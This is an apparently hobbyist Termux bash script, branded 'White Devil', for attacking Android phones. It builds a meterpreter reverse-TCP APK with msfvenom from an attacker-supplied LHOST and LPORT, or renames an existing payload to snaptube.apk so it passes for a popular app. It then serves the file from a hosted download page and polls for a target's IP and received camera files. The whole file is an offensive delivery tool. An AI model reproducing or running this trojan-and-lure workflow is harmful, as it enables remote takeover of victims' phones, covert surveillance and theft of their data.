#!bin/bash
clear

# Add some colours
red='\033[1;31m'
green='\033[1;32m'
yellow='\033[1;33m'
blue='\033[1;34m'
light_cyan='\033[1;96m'
reset='\033[0m'
  
  
  function banner(){
  
  printf "   ${red}###########################################################   \n"
  printf "          ##   ${green}                                       ##   \n"
  printf "          ##   ${green}######  ####### #     # ### #          ##   \n"
  printf "          ##   ${green}#     # #       #     #  #  #          ##   \n"
  printf "          ##   ${green}#     # #       #     #  #  #          ##   \n"
  printf "          ##   ${red}#     # #####   #     #  #  #          ##     \n"
  printf "          ##   ${green}#     # #        #   #   #  #          ##   \n"
  printf "          ##   ${green}#     # #         # #    #  #          ##   \n"
  printf "          ##   ${green}######  #######    #    ### #######    ##   \n"
  printf "          ##   ${green}                                       ##   \n"
  printf "    ${red}########  ######## DJshalani 1.1v ########################   \n"
  printf "${red} \n"
  printf "${red} \n"
  printf "${red} \n"
  
  printf "    ${blue}[+] YouTube : White Devil     \n"
  printf "\n"
  printf "    ${blue}[+] GitHub  : DJshalani \n"
  printf "\n"
  printf "    ${blue}[+] Email   : Devilshalani@gmail.com \n"
  printf "\n"
  printf "\n"
  printf "    ${green}[=] Devil Exploiting Using Webhosting\n"
  printf "\n"
  printf "    ${green}[+] Type devil To Tun This Tool\n"

}

banner


printf "\n"
printf "\n"
printf "\n"
printf "\n"


printf "${green} [1] have a payload \n"
printf "\n"
printf "${green} [2] create a payload \n"
printf "\n"

read -p 'Enter a value : ' choose_sub


if [[ $choose_sub == "1" ]]; then
  #statements
  
  if [[ -e /data/data/com.termux/files/usr/share/devil/index/index.html ]]; then
    #statements
    if [[ -e /data/data/com.termux/files/usr/share/devil/index/index.css ]]; then
      #statements
      if [[ -e /data/data/com.termux/files/home/payload ]]; then
        #statements
        cd /data/data/com.termux/files/home/payload
        mv * snaptube.apk > /dev/null 2>&1
        if [[ -e /data/data/com.termux/files/home/payload/snaptube.apk ]]; then
          #statements
          mv /data/data/com.termux/files/home/payload/snaptube.apk /data/data/com.termux/files/usr/share/devil/index/download/ > /dev/null 2>&1
          if [[ -e /data/data/com.termux/files/usr/share/devil/index/download/snaptube.apk ]]; then
            #statements
            rm /data/data/com.termux/files/home/payload/* > /dev/null 2>&1
            bash /data/data/com.termux/files/usr/share/devil/index/devil_hoster.sh
          else
              printf "\e[1;93m[!] sorry you have create a payload and save it this location.... \n [  /data/data/com.termux/files/home/payload/  ] "
              exit 1
          fi
        else
            printf "\e[1;93m[!] sorry you have create a payload and save it this location.... \n [  /data/data/com.termux/files/home/payload/  ] "
            exit 1
        fi
      else
          printf "\e[1;93m[!] sorry you have unknown error \n"
          exit 1
      fi
    else
        printf "\e[1;93m[!] sorry you have unknown error \n"
        exit 1
    fi
  else
  printf"${green}Enter LPORT : "
      exit 1
  fi
else
  
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Enter apk name \e[0m\e[1;33m: \e[0m'
  read name
  
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Enter LHOST \e[0m\e[1;33m: \e[0m'
  read host
  
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Enter LPORT \e[0m\e[1;33m: \e[0m'
  read port
  
  
  printf "\n"
  printf "${green}Creating Payload wait.........."
  
  printf "\n"
  printf "\n"
  printf "\n"
  printf "\n"
  
  msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > /storage/1D4A-17E8/termux_tools/payload/$name.apk
  
fi
checkfound() {
  
  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Done White Devil ,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
  
  while [ true ]; do
  
  
  if [[ -e "ip.txt" ]]; then
  printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
  catch_ip
  rm -rf ip.txt
  
  fi
  
  sleep 0.5
  
  if [[ -e "Log.log" ]]; then
  printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
  rm -rf Log.log
  fi
  sleep 0.5
  
  done 
  }
  
  
checkfound
  






# Add some colours
red='\033[1;31m'
green='\033[1;32m'
yellow='\033[1;33m'
blue='\033[1;34m'
light_cyan='\033[1;96m'
reset='\033[0m'











